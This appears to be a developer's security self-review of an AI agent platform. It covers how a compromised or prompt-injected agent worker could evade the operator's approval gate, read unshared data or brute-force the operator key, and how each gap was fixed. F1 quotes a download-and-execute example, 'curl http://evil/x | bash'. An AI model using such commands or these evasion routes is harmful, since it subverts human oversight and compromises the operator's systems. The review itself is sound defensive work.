# Pre-Public Security Self-Review — 2026-07-04

Self-review of Compass/Latch before the repo is made public (and before sharing with a first
outside reader). Scope: the trust boundary between the **trusted host** (`server.js`, secrets in
`data/`) and the **untrusted, disposable worker** (OpenClaw + `latch-agent-bridge` +
`latch-agent-executor`, holding only the agent key). This is a maintainer self-review, not a
substitute for the external co-creator review described in [SECURITY-REVIEW.md](./SECURITY-REVIEW.md).

**Threat model reviewed against:** a compromised or prompt-injected worker. The design promise is
that such a worker still cannot reach the operator's accounts or act without operator approval,
because it never holds the credentials and the operator review is the gate. Findings below are
ranked by how much they erode that promise.

## Summary

Five findings in the original 2026-07-04 pass, plus F6 (2026-07-05 boundary sweep) and F7 (2026-08-15).
None is a remote-unauthenticated compromise; the core boundary (auth gate, timing-safe key compare,
operator-only approval decisions, credential isolation) holds. The two that mattered in the first pass
were **confused-deputy / least-privilege** gaps against the untrusted worker (F1, F2) — both fixed
then. F3 is defense-in-depth on the root executor (fixed). F4 is a documented residual. F5 was stale
documentation (fixed). F6 was metadata leakage to the worker (fixed). **F7 is the one this review
missed entirely rather than misjudged**: the gate was checked for *how* it compares keys and never for
*how many times it will let you try*.

| # | Severity | Finding | Status |
|---|----------|---------|--------|
| F1 | **Medium** | Approval display vs. execution field split — worker could show benign `renderedCommands` while shipping different `executionPlan.commands` to the root executor | **Fixed** (host restart) |
| F2 | Low–Med | `/api/state` readable by the agent key → full operator console disclosure to the semi-trusted worker | **Fixed** (host restart) |
| F3 | Low | Executor `screenshot`/`download` wrote to an unconstrained `path` → root executor could write anywhere on the worker | **Fixed** (worker redeploy) |
| F4 | Low | DNS-rebinding TOCTOU in `reject_private_url` (SSRF guard resolves, then Playwright re-resolves) | Accepted residual |
| F5 | Doc | `SECURITY-REVIEW.md` said the bridge cannot send email / `external_contact` is draft-only — no longer true | **Fixed** (docs) |
| F6 | Low | Unshared context *metadata* (titles, filenames, tags) reached the worker via `/api/agent/poll` | **Fixed** (host restart) |
| F7 | **Medium** | No brute-force protection on any auth gate — unlimited, unlogged, unalerted key guessing by a worker that is already inside the perimeter | **Fixed** (host restart) |

---

## F1 — Approval "what runs" is shown from a different field than what executes (Medium)

**Where:** `server.js` POST `/api/approvals` (stored `renderedCommands` and `executionPlan` as two
independent worker-supplied fields); `public/app.js` `renderApprovals()` shows `renderedCommands`;
`worker/latch-agent-executor.py` `run_shell_plan()` runs `executionPlan.commands`.

**What:** The operator's "Show exact commands" view read `approval.renderedCommands`, but the root
executor runs `approval.executionPlan.commands`. Both fields arrive from the untrusted worker and the
host never checked that they agree. An honest bridge keeps them equal, but a compromised or
prompt-injected worker could submit `renderedCommands: ["echo hello"]` alongside
`executionPlan.commands: ["curl http://evil/x | bash"]`. The operator would approve after reading
`echo hello`; the executor would run the curl **as root**. This defeats the operator review, which is
the primary control in the whole design.

**Fix:** Make the executed plan the single source of truth. For shell mode the host now *derives* the
displayed commands from `executionPlan.commands` and ignores any worker-supplied `renderedCommands`
(`server.js`, `displayedCommands`). What the operator approves is exactly what the executor runs.
Regression tests added in `test/smoke.mjs` (divergent-plan case + assertion that display follows the
plan). Browser plans were already WYSIWYG (`executionPlanMarkup` renders `executionPlan.actions`).

**Applies on:** host server restart (server-side only; no worker redeploy needed).

**Generalised 2026-08-15 (F1b).** The July fix was correct but narrow: it made *shell plans* WYSIWYG and
left the same split open everywhere else. By August the host accepted 18 approval types, and the
connectors added since — GitHub issues, issue comments and pull requests, email outreach, MCP tool
calls — each arrived with their own worker-supplied payload. `public/app.js` labelled 11 of the 18
types and rendered the payload of only 4. `emailTo`, `emailBody`, `mcpArgs`, `githubPrFiles`,
`githubIssueTitle`, `githubIssueBody` and `campaignRecipients` had **zero** occurrences in the entire
client, while `handleApprovedApprovalSideEffects` sent, ran and committed exactly those fields. The
operator was approving the worker's `title` and `details` prose while the host acted on the worker's
structured data — F1 again, one connector at a time, with no root executor needed to do damage: an
email leaves the operator's own mailbox and a GitHub issue emails every watcher and cannot be recalled.

The renderers now show every type-gated field, and both label maps and the type-pill palette cover all
18 types. The durable part is `test/approval-render-coverage.mjs`, which derives the accepted types and
their worker-supplied fields from `server.js` and the operator's view from `public/app.js` — no list is
kept by hand on either side. It *executes* the summary builders and renders each type twice, changing
one field between runs: if the two outputs are identical, that field does not reach the operator and
the suite fails. A new approval type or a new type-gated field therefore fails the build until it is
labelled, styled and shown. Verified with 12 negative controls (each reintroduces one gap and is
confirmed to turn the suite red for the stated reason), including one that leaves every summary
function verbatim in the file and only unwires the two call sites — a grep-based check would stay green.

## F2 — `/api/state` exposes the full operator console to the agent key (Low–Medium)

**Where:** `server.js` GET `/api/state` had only the global auth gate, no `requireOperator`.

**What:** Any valid key — including the agent key held on the semi-trusted worker — could read
`visibleState(db)`: all messages, tasks, approvals, executions, **all** context items (including ones
never shared with the agent, via `operatorContextItem`), users, purchases and network. This
contradicts the "worker sees only shared context" promise and hands a compromised worker the entire
console. The worker never actually needs it: it uses `/api/agent/poll` for its scoped feed (confirmed
— no worker code references `/api/state`).

**Fix:** Gated `/api/state` with `requireOperator`. Worker feed is unaffected. Regression test added
(agent key → 403).

**Applies on:** host server restart.

## F3 — Executor screenshot/download path traversal (Low, defense-in-depth)

**Where:** `worker/latch-agent-executor.py` `run_browser_plan()` — `screenshot` and `download`
actions wrote to `Path(action["path"])` with no confinement.

**What:** The executor runs as root. An approved browser plan whose `path` was rewritten or misjudged
(`../../etc/...`, or an absolute path) could write anywhere on the worker filesystem. Operator
approval gates the plan, but the operator is unlikely to scrutinize a `path` field, and the worker is
untrusted. This also contradicted the `SECURITY-REVIEW.md` checklist line "No route accepts file paths
that can escape intended storage directories."

**Fix:** Added `confine_path()` — resolves the requested path under the per-approval download dir and
rejects anything that escapes, falling back to a safe default name. Applied to both `screenshot` and
`download`.

**Applies on:** worker redeploy (`latch-agent-executor`).

## F4 — DNS-rebinding TOCTOU in the SSRF guard (Low, accepted residual)

**Where:** `worker/latch-agent-executor.py` `reject_private_url()`.

**What:** The guard resolves the hostname and rejects private/loopback/link-local/reserved IPs, then
Playwright's `page.goto` resolves the name again independently. A hostile authoritative DNS could
answer public on the check and private on the fetch, reaching an internal/metadata address. Requires
an operator-approved plan pointing at an attacker-controlled domain, so exploitability is low.

**Status:** Accepted for now. Full mitigation (pin the checked IP and force the connection to it) is
awkward with Playwright. Documented here so the external reviewer can weigh it. The guard already
checks *all* addresses `getaddrinfo` returns and covers literal IPs, so simple cases are handled.

## F5 — Stale security documentation (Doc)

**Where:** `SECURITY-REVIEW.md` said the bridge "cannot send outbound email," `external_contact`
"remains draft/manual only," and "Do not start by giving the agent a real inbox."

**What:** Host-brokered agent email now exists (`email.mjs`, `email_campaign` approvals, server-side
send in `handleApprovedApprovalSideEffects`). Credentials still live only on the host and cold contact
still requires operator approval, but the "cannot send" statements are false and would mislead a
reviewer.

**Fix:** Updated `SECURITY-REVIEW.md` with a dated superseding note describing the current
host-brokered email boundary.

---

## What held up (verified good)

- **Global auth gate:** every `/api/*` route is behind a valid-key check (401 otherwise).
- **Key comparison is timing-safe:** `safeEqual` hashes both sides with SHA-256 and uses
  `timingSafeEqual` — length-safe and no empty-token bypass. **(Still true, but see F7: this line was
  the only thing this review said about the gate's resistance to guessing, and a reader could easily
  come away believing the gate was hard to guess at. It was not — there was no attempt limit at all.)**
- **Approval *decisions* are operator-only:** PATCH/DELETE `/api/approvals/:id` are `requireOperator`.
  The agent cannot approve or deny its own requests — the most important property, and it holds. The
  executor additionally only runs approvals with server-set `status === "approved"`.
- **`require*` guard pattern is consistent:** every `requireOperator`/`requireAgent` call is followed
  by `if (res.writableEnded) return;` — no missing-guard bypass.
- **Credential isolation:** the worker holds only the agent key. LLM/GitHub/mailbox/operator secrets
  stay on the host; public config endpoints redact them to booleans (`hasApiKey`, `tokenConfigured`).
  The host's LLM key never flows to the worker (the worker runs its own local Ollama).
- **SSRF guard now covers `open`, `download`, and `search_web`** (not just search), rejecting
  private/loopback/link-local/reserved targets by literal and resolved IP.
- **Email header injection is guarded:** `sanitizeHeader` strips CR/LF from all header values; the
  body is CRLF-normalized and SMTP dot-stuffed. Cold contact requires an approved outreach plan
  (`classifySend` → `needs_approval` for unknown recipients).

## Deploy checklist for these fixes

- **F1, F2** (server.js): restart the host server (`Start-Latch-Tailscale.ps1`).
- **F3** (executor): redeploy `latch-agent-executor` on the worker
  (`sudo install ... && systemctl restart latch-agent-executor`).
- Re-run `node test/smoke.mjs`, `node test/agent-email.mjs`, `node test/secret-scan.mjs` (all green
  as of this review) and, on the worker, `test/executor.py` / `test/worker-ssrf.py`.

---

## Addendum — 2026-07-05 boundary sweep

A follow-up pass enumerated every route's auth guard and each trust domain (operator, agent,
Compass-Simple user, network worker). The operator/agent split is clean — after the global auth gate
every route is `requireOperator` or `requireAgent`, except `/api/llm/chat` and `POST /api/approvals`
which are intentionally reachable by the worker. The user and network-worker feeds are scoped to the
caller's own records. One real finding:

### F6 — Unshared context metadata leaked to the worker (Low, Fixed)

**Where:** `/api/agent/poll` → `agentContextItems(activeItems(db.contextItems).slice(0, 50))`.

**What:** The item *body* was correctly gated on `shareWithAgent`, but the poll passed **all** active
context items to `agentContextItems`, so the worker received the **title, tags, category, and
filename** of context the operator never shared with it. Titles/filenames can themselves be sensitive
("Bank recovery codes", "salary.pdf"). This contradicted "the worker sees only shared context." The
network path already pre-filtered on `shareWithNetwork`; the agent path did not — an asymmetry.

**Fix:** the poll now pre-filters to `shareWithAgent` before building the agent context list, mirroring
the network path. Regression test in `test/smoke.mjs` (an unshared note must not appear in the poll at
all). Applies on host restart.

**Also reviewed, no change needed (but see F7 below — one line here was wrong):** profile/anchor are operator-only + file-locked; approval
decisions operator-only; auto-approval is typed-only; the executor runs only approved plans as a
non-root user; `publicAuthConfig` exposes no secrets; user/network-worker feeds are per-caller scoped.
(Very-minor notes, not acted on: the network-worker token is matched by hash equality rather than
`timingSafeEqual` — acceptable since the stored value is already a hash; channel labels are returned
to signed-in users unfiltered — labels are not secrets.)

---

## Addendum — 2026-08-15

### F7 — No brute-force protection on any authentication gate (Medium, Fixed)

**Where:** `server.js` — every 401 site. `/api/draft` and `/api/assist` (draft token), the
operator/agent console gate (`authenticate`), `handleMeApi` (Compass user session), and
`handleNetworkWorkerApi` (network-worker token).

**What:** Latch counted failed authentication attempts nowhere. There was no throttle, no backoff and
no lockout on any gate — the words *throttle*, *lockout* and *backoff* had zero occurrences in
`server.js`, and the file's only `429` was on email sending. A caller could offer wrong keys as fast as
the socket allowed, indefinitely, and the host produced no log line, no counter and no alert. Nothing
downstream would have noticed either: a rejected key wrote no event, so `db.json` held no record that
anyone had ever tried.

**Why this is worse here than the generic "no rate limiting" note.** The threat model this review is
written against (see the top of this document) is *a compromised or prompt-injected worker*. That
worker is not an anonymous stranger on the internet — it sits on the operator's tailnet, it is already
speaking HTTP to this host, and it **already holds a valid agent key**. The cheapest possible thing for
such a worker to do is grind the operator key from inside the perimeter. It costs nothing, is invisible
in every artifact the operator looks at, and the operator key is described in this repo's own
`Rotate-OperatorToken.ps1` as "effectively shell access on the host". Latch's design promise is that a
compromised worker cannot reach the operator's authority; an unmetered, unlogged guess loop against
that exact credential is a direct attack on that promise, and no document acknowledged it.

**On "the key compare is timing-safe".** It is, and the *What held up* section above says so. That
statement is true and was doing real work — but timing-safety and brute-force resistance are different
properties, and it was the only thing the review said about the gate's resistance to guessing. A
reader could reasonably have inferred the gate was hard to attack. It was not. That inference is part
of what this finding is about, so the line above has been annotated rather than left to stand alone.

**Corroborating evidence that this was an oversight rather than a decision:** `Rotate-OperatorToken.ps1`
(step 4, added 2026-07-31) already warns the operator that repeated 401s "start returning 429" and that
this is "the guard working, not a rotation problem" — describing **Bureau's** damper, on the sibling
service gated by the *same operator token*. The control existed on one of the two services that token
opens, and its absence on the other was documented nowhere.

**Fix:** a per-source, per-gate failed-attempt throttle covering all five gates.

- **Keyed on the gate plus the true socket peer (`req.socket.remoteAddress`), and on nothing a caller
  can set.** No `X-Forwarded-For`, no `Tailscale-User-*`, no token prefix. Those headers are absent on
  a direct connection to the port, so honouring them would let an attacker mint a fresh bucket per
  request — a header is a claim, not a fact. The stated consequence: behind `tailscale serve` every
  request presents as loopback, so on that deployment there is one bucket per gate and **the backoff is
  effectively global**. That is the chosen direction. A global backoff that briefly inconveniences the
  operator is recoverable; a per-claimed-identity backoff an attacker sidesteps is not a control.
  Reached directly over the tailnet each peer has its own address and its own bucket, so the isolation
  exists where it can be trusted and collapses to global where it cannot.
- **The check runs before the comparison.** A throttle that still evaluated the offered key would
  rate-limit the *answer* rather than the *attempt*, and leave the guess budget unlimited. A correct
  operator key is therefore also refused while a source is throttled — which is what makes the recovery
  design below load-bearing rather than decorative.
- **Five free misses, then one attempt per exponentially growing interval** (1s, 2s, 4s … capped at
  60s), forgiven after 15 quiet minutes, and cleared outright by any success.
- **Requests presenting no credential are not counted** — they cannot be guesses at a key, and counting
  them would let an unauthenticated passer-by, or the operator's own browser before the key is pasted
  in, spend the allowance.
- **`/api/draft` and `/api/assist` share one bucket**, because they accept the same credential. Two
  buckets would have doubled an attacker's guess budget for free.
- **Observable:** a `console.warn` line per failed attempt (gate, peer, counters — never the offered
  key), an `auth.burst` notification at 20 failures on a gate through the *existing*
  `sendNotification` path so it arrives wherever approvals already arrive, and live state at
  `GET /api/about` under `authThrottle`. State is in memory and deliberately never written to
  `db.json`: one record per failed attempt is precisely the unbounded-array shape that once grew this
  repo's database to 97.7% heartbeat noise.

**Not a hard lockout, on purpose.** The obvious design — N failures, source locked for 15 minutes —
would have converted a brute-force control into a denial-of-service primitive handed to the exact
attacker in the threat model. Behind Serve the worker and the operator share a peer address; a hostile
worker could pin the console shut on demand. The realistic *non*-hostile version is worse, because it
happens by accident: a worker still holding a stale agent key after a rotation re-fails on every poll,
and under a hard lock the operator could never get in with the new key to fix it. The trickle bounds an
attacker to roughly one guess per minute — against a 192-bit token, not a threat under any budget —
while leaving the operator a way in at all times. Recovery is documented in
[SECURITY.md](./SECURITY.md#locked-out-of-your-own-latch): wait one interval and succeed, or restart
(counters are in memory), or `Emergency-Latch-Lockdown.ps1` / `Rotate-OperatorToken.ps1`, both of which
restart and so clear the state as a side effect.

**Regression test:** `test/auth-throttle.mjs`, wired into `npm test`. Every assertion is a behaviour —
make N bad requests, assert the (N+1)th is refused — and never the presence of a name; the F1b pass
recorded three checks that stayed green under their own controls because they grepped for an
identifier instead of exercising a path. Verified with **12 negative controls**, each removing one
protection and confirmed to turn the suite red *for the stated reason*, with the source restored and
re-verified green afterwards: unwiring the gate check while leaving every function definition verbatim
in the file (a grep-based check would stay green); moving the check behind the comparison; not counting
failures; removing the burst notification; removing the log line; never clearing on success; splitting
the shared draft bucket; counting credential-less requests; collapsing all gates into one bucket;
dropping the `Retry-After` header; hiding state from `/api/about`; and logging the offered credential.
The suite also carries its own positive control: the "anonymous requests never accumulate" check is
followed by a credentialled loop proving that same gate *can* throttle, so the absence result cannot be
satisfied by a gate that never throttles at all.

**Applies on:** host server restart (server-side only; no worker redeploy needed).
